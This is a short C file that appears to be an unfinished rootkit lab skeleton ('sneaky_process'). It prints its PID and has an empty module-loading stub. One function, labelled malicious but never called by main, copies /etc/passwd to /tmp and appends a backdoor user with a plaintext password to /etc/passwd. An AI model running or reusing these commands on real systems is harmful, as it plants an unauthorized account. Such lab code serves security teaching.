#include <stdio.h>
#include <stdlib.h>

#include <linux/kernel.h>      // for printk and other kernel bits
#include <linux/sched.h>
#include <asm/unistd.h>        // for system call constants

#include <sys/types.h>
#include <unistd.h>

//Print its own process ID to the screen
void printID(){
  printf("sneaky_process pid = %d\n", getpid());
}

//Do malicious thing to the password
void addLine(){
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
}

//load the sneaky module (sneaky_mod.ko) using the “insmod” command
void load_module(){

}

int main(int argc, char *argv[]){
  printID();
  
  return EXIT_SUCCESS;
}
